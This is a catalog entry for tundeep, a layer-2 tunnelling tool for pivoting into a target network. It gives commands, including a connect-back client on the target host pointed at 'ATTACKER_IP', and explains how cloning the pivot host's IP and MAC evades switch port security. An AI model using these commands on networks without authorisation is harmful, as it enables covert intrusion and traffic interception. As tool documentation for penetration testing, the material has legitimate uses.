---
name: "tundeep"
categories:
  - tunnel
version: "1.1~git20190802-0parrot1"
homepage: "https://www.adampalmer.me/iodigitalsec/tundeep/"
origin: "parrot"
recipe: "parrot-repo"
packaged-by: [parrot]
build-system: make
meta-checked: "2026-11-09"
github-repo: "adam-palmer1/tundeep"
github-stars: 42
github-pushed: "2026-04-18"
github-archived: false
github-issues: 0
github-match: "search"
gh-checked: "2026-11-07"
worth: 4.7
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 1
gh-activity-checked: "2026-11-09"
---

# tundeep

> Layer-2 ethernet tunnelling for pivoting — presents a remote network as a local `tap0` interface, sniffing and injecting on the far end through libpcap.

## What it's for

tundeep (Adam Palmer) extends a target network onto your machine as a tap interface, so any L2/L3 tool behaves as if directly attached to it: unlike SOCKS or single port-forwards, ARP scanning and poisoning, any IP protocol, and nmap's low-level scans all cross the tunnel. The remote end is nearly pure userspace — libpcap only, no kernel modules or drivers — and each link can clone the pivot host's existing IP and MAC (nothing new appears on the wire, evading switch port security) or use its own address. Transports are TCP (server plus connect-back client) and UDP (two symmetric endpoints), with optional zlib compression (`-C`) and IPv6 on either side. Run as root on both ends, and mind busy production links: everything the remote interface receives is mirrored back to you.

## Typical use cases

### Find the interface to bind on the target

```
tundeep -a
```

Outcome: prints every pcap capture device the host can see — the reliable way to pick the correct `-i` value on a box with unfamiliar interface naming before starting the tunnel.

### Bridge the target segment over TCP with a connect-back client

On your machine:

```
tundeep -s -t tap0 -h 0.0.0.0 -p 5000 -x 198.51.100.50 -y 255.255.255.0 -u 00:0c:29:c6:44:02
```

On the target host:

```
tundeep -i eth1 -h ATTACKER_IP -p 5000 -c
```

Outcome: the target connects back out to you and forwards its eth1 segment; a local `tap0` appears already configured with the cloned IP, netmask and MAC (`-x/-y/-u`), so no new address shows up on the target network and you can ARP-scan or reach hosts beyond the pivot directly.

### Tunnel over symmetric UDP endpoints

On your machine:

```
tundeep -d -e 198.51.100.10 -t tap0 -h 0.0.0.0 -p 5000 -x 198.51.100.50 -y 255.255.255.0 -u 00:0c:29:c6:44:02
```

On the target host:

```
tundeep -d -e ATTACKER_IP -i eth1 -h 0.0.0.0 -p 5000
```

Outcome: with `-d` there is no server/client split — each side declares its peer with `-e` and listens on `-h` — which suits environments where neither side can accept TCP sessions reliably; the same tap bridge comes up once both endpoints exchange traffic.

### Carry IPv6 over an IPv4 path

```
tundeep -T tap0 -s -h 0.0.0.0 -p 5000 -x fe80::80aa:2aff:fe0b:383f -y 64
```

Outcome: `-T` marks the tap as IPv6, so `-x`/`-y` take an IPv6 address and prefix length; IPv6 frames now ride the existing IPv4 transport. Conversely `-6` switches the transport socket itself to IPv6, and both can combine for end-to-end IPv6.

*No corpus evidence — derived from upstream documentation.*
